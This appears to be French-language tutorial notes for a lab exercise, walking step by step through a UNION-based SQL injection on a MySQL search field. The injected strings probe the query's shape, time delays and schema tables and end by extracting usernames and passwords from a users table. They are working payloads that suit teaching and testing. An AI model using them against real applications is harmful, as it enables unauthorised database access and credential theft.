# Ouvrez ce document dans un editeur de code pour voir facilement les différences dans les requêtes ci dessous

-- On émet une hypothèse sur la requête de base
-- Ca doit select au moins 3 paramètres sur une table
SELECT ?, ?, ? FROM ? WHERE ? LIKE '?';

-- On vérifie si celle ci utilise des wildcards (%) pour compléter la réponse
SELECT ?, ?, ? FROM ? WHERE ? LIKE '% ? %';

-- En testant ceci, la requête devrait renvoyer tout les résultats
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%'; -- ? %';
#query: '; --

-- Le serveur mySQL devrait mettre 3 secondes 
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%war%' AND 0 = SLEEP(3); -- ? %';
#query: war%' AND 0=SLEEP(3); --

-- Ici, le but est de savoir le nombre de champ récupéré par la requête, la table dual est une table placeholder
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%war%' UNION (SELECT 1, 2, 3 FROM dual); -- ? %';
#query: war%' UNION (SELECT 1, 2, 3 FROM dual); --

-- Maintenant, nous allons chercher la liste des tables
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%war%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, "a" FROM INFORMATION_SCHEMA.TABLES); -- ? %';
#query: war%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, "a" FROM INFORMATION_SCHEMA.TABLES); --

-- La table users a retenu notre attention, allons chercher les champs qu'elle contient
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%war%' UNION (SELECT COLUMN_NAME, "a", "b" FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "users"); -- ? %';
#query: war%' UNION (SELECT COLUMN_NAME, "a", "b" FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "users"); --

-- Bingo
SELECT ?, ?, ? FROM ? WHERE ? LIKE '%war%' UNION (SELECT pk, username, password FROM users); -- ? %';
#query: war%' UNION (SELECT pk, username, password FROM users); --
